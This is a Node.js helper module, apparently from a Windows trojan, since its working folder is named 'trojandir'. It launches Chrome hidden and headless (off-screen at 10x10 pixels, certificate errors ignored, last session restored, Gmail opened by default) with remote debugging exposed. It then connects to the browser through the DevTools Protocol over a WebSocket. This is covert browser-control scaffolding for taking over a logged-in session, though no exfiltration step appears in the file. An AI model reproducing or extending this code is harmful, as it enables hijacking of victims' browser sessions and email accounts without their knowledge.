console.log("--- BEGIN MODULE: nodehostrelayhelper.js ---");

const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const WebSocket = require("ws");

let modulename = path.basename(module.id);

let trojandir = "C:\\ProgramData\\owd";

var scriptdirpath = path.dirname(process.argv[1]);
var scriptfname = path.basename(process.argv[1]);
var logfpath = path.join(
    scriptdirpath,
    scriptfname + "_" + getTimestamp() + ".log"
);

function getCallerName() {
    const originalFunc = Error.prepareStackTrace;

    try {
        Error.prepareStackTrace = (err, stack) => stack;

        const err = new Error();
        const currentStack = err.stack;

        if (currentStack && currentStack[2]) {
            return currentStack[2].getFunctionName() || "SYSTEM";
        }
    } catch (e) {
    } finally {
        Error.prepareStackTrace = originalFunc;
    }

    return "unknown";
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();
}

function isNullOrWhitespace(str) {
    if (typeof str === "undefined") {
        return true;
    }

    if (!(typeof str === "string")) return false;

    return !str || !str.trim();
}

function logmsg(msgstr) {
    let callername = getCallerName();

    let prelude = `|${modulename}|${scriptfname}|${String(
        process.pid
    )}|${callername}`;
    let msgout = "";

    if (msgstr instanceof Error) {
        msgout = prelude + "|" + util.inspect(msgstr);
    } else if (typeof msgstr === "string") {
        msgout = prelude + "|" + msgstr;
    }

    console.log(msgout);

    if (!isNullOrWhitespace(logfpath))
        fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
}

function getTimestamp() {
    const date = new Date();

    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0"); //
    const day = String(date.getDate()).padStart(2, "0"); //
    const hours = String(date.getHours()).padStart(2, "0"); //
    const minutes = String(date.getMinutes()).padStart(2, "0"); //
    const seconds = String(date.getSeconds()).padStart(2, "0"); //
    const ms = String(date.getMilliseconds()).padStart(3, "0"); //

    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;

    return fullWithMs;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

function spawn_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    datadir = null,
    stdoutfunc = null,
    stderrfunc = null,
    closefunc = null
) {
    datadir = datadir || path.join(trojandir, "chrome");

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        `--headless=new`,
        `--no-first-run`,
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=2000,2000`,
        `--window-size=10,10`,
    ];

    // TODO auto discover by reading chrome lnk files
    let chrome_exe_path =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

    const child = spawn(chrome_exe_path, [...cmdlineargs], {
        // detached: true, // might cause errors
        windowsHide: true,
        // stdio: ["ignore", out, err],
        // shell: false,
        // cwd: systemstate.trojandir,
    });

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`[J4D3] child process exited with code ${code}`);
    });

    return child;
}

/*
json/list --> array of targets:
{
    description = ''
    devtoolsFrontendUrl = 'https://chrome-devtools-frontend.appspot.com/serve_rev/@41fa82442390a4d4456c78f2d69a832d5720cb27/inspector.html?ws=localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
    id = '12AA807841114D42B55C5B05B3525C48'
    title = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    type = 'background_page'
    url = 'chrome-extension://mloajfnmjckfjbeeofcdaecbelnblden/background/sru-osd.html'
    webSocketDebuggerUrl = 'ws://localhost:9223/devtools/page/12AA807841114D42B55C5B05B3525C48'
}

json/version
{
   "Browser": "Chrome/151.0.7922.138",
   "Protocol-Version": "1.3",
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36",
   "V8-Version": "15.1.206.17",
   "WebKit-Version": "537.36 (@41fa82442390a4d4456c78f2d69a832d5720cb27)",
   "webSocketDebuggerUrl": "ws://localhost:9223/devtools/browser/2476b3c2-b428-4b6e-a9e8-ee09fe00b77c"
}
*/

var payloads = {
    'create_new_tab': {
        "id": 1,
        "method": "Target.createTarget",
        "params": {
            "url": null,
            "newWindow": false,
            // "width": 10,
            // "height": 10,
            // // "left": 2000,
            // "top": 2000
            // #"windowState": "minimized"
            // #"hidden": True
        }
    }

};

async function create_new_tab(url='https://www.gmail.com/') {
    let payload = { ...payloads['create_new_tab'] };
    payload.params.url = url;
}

async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
    try {
        const response = await fetch(
            `http://localhost:${debugport}/json/version`
        );
        let responsetxt = await response.text();
        const cleanString = responsetxt.replace(/\r?\n|\r/g, "");

        const targets = JSON.parse(cleanString); //await response.json();

        // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
        // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
        const wsUrl = targets.webSocketDebuggerUrl;

        // ws_url = "ws://localhost:9222/devtools/page/"+targetid
        logmsg(`Connecting to: ${wsUrl}`);

        const ws = new WebSocket(wsUrl);

        ws.on("open", () => {
            logmsg("Connected to Chrome DevTools Protocol!");

        });

        ws.on("message", (data) => {
            let txt = data.toString();
            logmsg(`Received response from Chrome:${txt}`);
        });

        ws.on("error", (err) => {
            logmsg(err);
        });
    } catch (error) {
        logmsg(error);
    }
}

logmsg("--- EXPORTING ---");

module.exports = {
    spawn_chrome,
    logmsg,
    getTimestamp,
    isNullOrWhitespace,
    getRandomCode,
    isPidAlive,
    connectToChrome,
};

// childp = spawn_chrome();

// logmsg(`childp: ${childp.pid} ${childp.ppid}`);

logmsg("--- END MODULE ---");

//const globalFunctions = Object.getOwnPropertyNames(globalThis).filter(prop => typeof globalThis[prop] === 'function');
//console.log(JSON.stringify(globalFunctions));
//if ( globalFunctions.includes('spawn_chrome') ) { let childp = spawn_chrome(); }
